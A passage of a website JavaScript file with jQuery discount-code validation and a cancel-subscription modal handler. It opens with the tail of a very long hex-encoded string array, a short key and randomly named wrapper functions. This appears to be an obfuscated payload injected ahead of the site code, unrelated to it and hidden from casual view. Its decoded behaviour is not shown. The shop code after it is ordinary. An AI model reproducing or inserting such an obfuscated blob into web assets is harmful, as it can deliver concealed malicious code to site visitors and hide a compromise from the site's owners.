67956534568597074161855134a65154f530b5e65544369194242400a045365474050650e650f6746655e146547500e420a065e07510b19650b6707514a434168450452440d0b51450b5e001f0b4e1f585b6519520e585875631968654358721e1756441f0b54655e525343444465186565185245651f1940545219651945674e1f65781f0b19507f4f45650b63197b16654f1f0b581f6c191c4c0b540b650b19525e796365746c4f1903655c6513477c15195b54671f190b435c190b6566715c59407e651e19431a65450a524c0b19676717147201045647046c651e7b5353540c654f65166510175858161e401952161965540b07120b5e44440e654278015e45131965195e4701125a1a0140655e0b4d0b1750450a5940526565796868651f65527d41655165120d796567650b59656565131965195a650b4565144c7254191e550b0147525e655114437b1919650b675d6565191f1b56685b5b1917197317500b1f455f411715035c1617575b650b5c52061754131302654d1965656a524211735e651719650b1f1f5452454472195658655f52511e12527b651e190d19691e52447465194a19630b67691917734e0b14655465477965451e5965655b6804530f601f540a1a04725246525e7a656552654d6556547442520b5b0b65445e19560c45540b195b53656e196556455b6554597851045f634453430b7a155a0b441f59474a0d7619514e650b65740b14654e0741650b4a0b65190b12564344165b65091a0b055b5b53195945020a1f710d1965655b5965546515444d0458150b516511041919166e0951651e5552655b445f477a120b51191f531656555e7165170440567a0b44521919465165195e6819117216191165656554654f4c656c65196808650516166565544f1e657e7a191e510a1406727b556565597d52567a5e5a061e65656568174b0b5b560b041e074e5453111914590a5b194b65440c19511f52541954440a544c0865181253681656597854520b65454f561910551e0a680b5a1e5e54765474655419590b651952171919651a0b76650219655a6c53650b0b05651976590e4f6554435a5472126c1919651b66430b42675168160b650a17436d65545b47671d19425247010b5119550f65650b5464455c0b524a65545c5354190c0b434d195b190b165e58190b4518050b650a5554656544617319651906550b54540b654a0b5f1c1917654163654768670b1945441f426766430d19190b09655c0e160a560c580b561d1900456a076e1e0f544a4d1f0b56196519520f655817435b1765541f76495e161d1f55651254651b5407430b17457a65650b17655e0b17195167521d1c721e5a19585d19195a0f5a1954651f130b511965195e53524e4a547565651644540b59580e650b59176540457907144365534254681a6564155e4c5e1e1f597a54650b07790b18610b0b191b071c40196a0b400b655252651b4018526519651e5e1917650b52171901655056194550441c665e4353195816544352567b65581e0465170b195453191819490b1719446b19520b44470265190b65654056161d19651e43651b5851656d0b6d4354655f446545131819657419195517155465431b105b52565467541765650b654d150b655e175b075865655365440019651f527454656819011568651919470b115c53535252190b0a19195b58190a650b1655191165540b43547445075a11546f421040595319440c44401c6503184442735e546755561719195e16580669454a7e0952030b0d654074655e540b6565655415191753654743070b19655c070b600f4517655965197354197479175b40585f195b1a0b650b47545565176752015f6e1a6543195472470d0b1c561a610b65566551101f0b45656565110b564d0b0365656519721e00194f4554075e5b7f65635e4454196d51655154654f1a435f1e1965140a160b741940155b4c526a521a650b180b44037943195847155452190365594c6465580b651e74546a1e521f65400f656519170b065f544c470f546416520b6508657c560a5e01655e6c197e6547651365554f6564545b19470b6716515616414144781916476565431972505b65430b19165e4253195b420b5e44196558650316196719545a19675e4a655819195b6779654e010a434c0b56521968166540654356651944511916196a036c5219655c724a1a4a415219191379405e73164a190765140b5e4456650447120b4a19566577657d43196570564f196510444774071665705445190571655e6552675665594465656559560b651e02620d15590a5453540876754319050719435354167406651754190b5253567619651f191b525b6554650b54110b1952746562655e514c567d7c651c524f1a4f0d675412525e77525465525c08476519031765650b6514135419195e1c16036565136504146519451f675e65650b541965545e6862164d6565650c42694b196d19441f636565635419534a650b4e1968540b1965654c135c650371751f136b0b401917190c650b5265036b4465540f0b6519656c725365174258656c4a611f19475310150b7d561f03474576651f1979540b0b45470419094d17525265160b190b02000d11671e546c65556565727a1f6867194a65651e190a655f450b1b746565651f0b5c04651c5f591712651965711e5b650c6519441765195d5b5a651f1f5b587f190b650b4c676552655e0b0b5453527c19651951650547651f56584919654e6565656c0d656508525e446567515c176e441f44041954170b03555b580b070b0e4c580b65637765191959655e650c565b0844586507500b631965435a0b4219446b08655b19686554544d03110d08071719026518544354030b65095f5e12195e145e4a0b6519725a54064f765951654c645445196519124b151967454565590b5465596716566565436551651967170f10650b7d761765115e0b5254544c6a545119655a5665195e4554195e65526d15590b4e160b17546517140b1b52541665530e445e541c680656194542191955191965525f0b65495e1358430b516553545e430b6b505868075b655a41711f0b520e440b6543431f1716655965014a0b195e43781919110e440353796554171958196565196a5d071765175a56030c450b4474561e11175a586c4f5b651d5f43161b7642471765421b516543516c5d1e671d546565060b65644117441605547e446519195200035f655310540d41444519440c0b521f0b68167a655165517b7b50565b1916194219650e1f7a545b561f534a437856194a65547e52555a725407791f6573125572131745530b54401e19710b78556d6065195d501962031556516557105a12185251564f6565650c6559560d004165075554195668650b0b5d65654419196f1e4447705e11411052195b1905197e19520e456552194410060a45195265524f555568656568520e54530b717e67161954651c0f1903030118620b0b5b44166a0b425747654442550b55097d674047775e5b650b5e1e5c1653657b5c65194345654f1f45451e121718191f6a550f5465441c41651a541e4a0d584465195414150b54465c0b525c195e5a6564791965447217556767591e0b524a58075215190653657e65161f451912197e191965514d56680865655c51181b435465657e51190b5e6517555365781954675453526519444a525d7155470c581951440b54685a540b5671195359540754176565651946591719655465195f657c5d0b6544195c540b046544195454634319434543594309400c187e546d540f450b5e1965430965544419194417444c6352170b16191c1965190b4265676558190b7c195a19561944457a0b6517195440655e540b651e59671f0b656552524243547d541247791965445452190a525651070b1077644a060b0b6e7e5d4516160b035619516565195b110b651319195b41194a4b0211651965160b1e4f51441955130d6554175b190b17581f7d19521914791900430b1e540b4017526507190a0b4e54171619196552080b5910756c655558105642654a1745565214650a195e651f444305195549170b6454194a43634465450b56651e17454e5e4516740b541743534915176f194343650b651653175419191652531965190b6517591964595216161e0318586f656542195259650b1945654665155b687a195251434345174365541968450b6519651953534c605f4c65190b19116565540b1950514a65544502055343524a531f4a08547100194f4e13600b16191954014754087954074d1f5f03196565580a6858561967511651035f651965531d520a531454540145454c581865566564194d1941196573540b196c650e1910436a11196565651a03651152406b54656e525859511743195a1e520a195e547c19654c1907445b06475465441f545f5b196065194e54194c525e5b0451430b4c181974191f19590b5b1e095a0b0b53060b5608175952540b65191956415b5865415d6550521968170a651c1965651940536519530112197e54541f1c43190d545e1019545f4319551965164403514368654f43560b444a7f1b545419535c65595419194a541417591e65191f681e5406041958431958194a0b16194365651e19430b1919190f6559197f4354430b555b65584354667059691d684f5a525467634a19190b0b4507175b72431653591507475119505b4a650b52655b63775e1919501e59520365420b51656563501954651954195252430b19196952521b450c434b475443526071441765505653654558701f5b435b17141f4e450b1914535343190b65175e1a580b44437e5316551e657e72431d656559116519540b5e655a5b651f1a1f5a43545c19654e1607656e7d0b5419655e0945451917400e546356650a0b6754537c6a686b05511f1714196544121943520b591865454e545419596554131967111951195e54547567796553650c6519020b65650b5a67584c1f654c68590b5b655e53195f6517195365596545167d406507196567654519090a1f510b5208190b75516a4f65545554675465444a0b651f441965676e19656568675c1f580b1f535b0b0752651b060d73064441195e5b5f526867654754546506465a19535a150b445e446753190817475a53655f655954431f0813654543654f19521e571919651947085e16650665451f174c19526365654a19544a0b65650f19196547651554500c19545407654565191743110459530252546755681965166556545465555453554a541f164c430b196559411979651149527644134d150b030b19585044517456655b0b585472655865654319190b44195e576508194450541919654465441910134f65544479656516655765586568591614651b160246511914757e65775b191b196a58655265564b0b656c430b0b0d4b566c030b654965161c72501a65195667165217115b0b0259125465655371454e5419441865190c4c4c1b7f190c0b590b191e031943535a651e4465531f5a65554c190b65541945675a19546552175465545c654f1e0b5411545e194e54525b424e0c1b196f5345655b656514175454511954651717651365545845451f194574470b794514721f6a655965155e5d59506565030b741356535b65565411431f161a6547196a535819545e654a42446545441f5917740b160c1951541954774d0b436503437465436543540a19540454515819161717650c0b51520f6553457a65656c53796c544e65540d0963590b5b69195b580f655e6565544444544a654347544c194465441919194a541965566e6c0b561d171e7e1f5b53651f40444501171d650016560b6419540b6b651975727b6552016e510b060b52546745735217445b0767557314656a5819100b5b195a17651f471e0b525c56541954651953191968420b56100b17655b5e55515a5953516a191f1265650b65797354657265146119195644566c5911651b130b1b650b580365655272651e44447b6a0f726465655265725e654c650b54194c17546070514a585f53545644196a191751670a17584401007258547e6758541719005e505471746519170b5472197917195565','705c444f7b'];HjHsHac$ObTDDGcJ=function(){return XHtRW$jPlpxJUnlKhDDd;};return HjHsHac$ObTDDGcJ();}
// Discount Code Validation
$(document).ready(function () {
    var $promoInput = $('input[name="promo"]');
    var $applyBtn = $('button:contains("Apply")').filter(function () {
        return $(this).closest('form').find('input[name="promo"]').length > 0;
    });

    if ($promoInput.length && $applyBtn.length) {
        // Prevent empty submissions
        $applyBtn.closest('form').on('submit', function (e) {
            if (!$promoInput.val().trim()) {
                e.preventDefault();
                alert('Please enter a discount code');
                return false;
            }
        });

        // Disable button when empty
        $promoInput.on('input', function () {
            $applyBtn.prop('disabled', !$(this).val().trim());
        });

        // Initial state
        $applyBtn.prop('disabled', !$promoInput.val().trim());
    }
});



// document.addEventListener('DOMContentLoaded', function () {

//     window.cancelSubscription = function () {
//         const modalEl = document.getElementById('cancelModal');
//         const modal = new bootstrap.Modal(modalEl);
//         modal.show();
//     };

//     window.confirmCancel = async function () {
//         try {
//             const response = await fetch('/subscription/cancel', {
//                 method: 'POST',
//                 headers: { 'Content-Type': 'application/json' },
//                 body: JSON.stringify({
//                     jsonrpc: '2.0',
//                     method: 'call',
//                     params: {}
//                 })
//             });

//             const result = await response.json();
//             const data = result.result;

//             if (data.status === 'success') {
//                 const modal = bootstrap.Modal.getInstance(
//                     document.getElementById('cancelModal')
//                 );
//                 modal.hide();

//                 showToast('success', data.message);

//                 setTimeout(() => {
//                     window.location.href = data.redirect;
//                 }, 2000);
//             } else {
//                 showToast('error', data.message);
//             }
//         } catch (err) {
//             console.error(err);
//             showToast('error', 'An error occurred. Please try again.');
//         }
//     };

//     function showToast(type, message) {
//         const toastId = type === 'success' ? 'successToast' : 'errorToast';
//         const messageId = type === 'success' ? 'successMessage' : 'errorMessage';

//         document.getElementById(messageId).textContent = message;

//         const toast = new bootstrap.Toast(
//             document.getElementById(toastId)
//         );
//         toast.show();
//     }

// });


// ================= Cancel Subscription Modal Action =================
window.confirmCancel = async function () {
    console.log("Cancel subscription request sent!");

    try {
        const response = await fetch('/subscription/cancel', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: '2.0',
                method: 'call',
                params: {}
            })
        });

        const jsonResponse = await response.json();
        console.log("FULL RESPONSE:", jsonResponse);

        // Fix wrapper handling
        const data = jsonResponse.result || jsonResponse;

        console.log("PARSED DATA:", data);

        if (data.status === "success") {
            console.log("Cancel success!", data);

            const modalEl = document.getElementById("cancelModal");
            if (modalEl) {
                modalEl.classList.remove("show");
                modalEl.style.display = "none";
                document.body.classList.remove("modal-open");
                // Remove backdrop if exists safely
                const backdrop = document.getElementsByClassName("modal-backdrop")[0];
                if (backdrop) {
                    backdrop.parentNode.removeChild(backdrop);
                }
            }

            console.log("Redirecting to:", data.redirect);
            setTimeout(() => {
                window.location.href = data.redirect || "/my_subscription";
            }, 1000);
        }
        else {
            alert(data.message || "Error");
        }

    } catch (err) {
        console.error("ERROR:", err);
        alert("Something went wrong, try again!");
    }
};
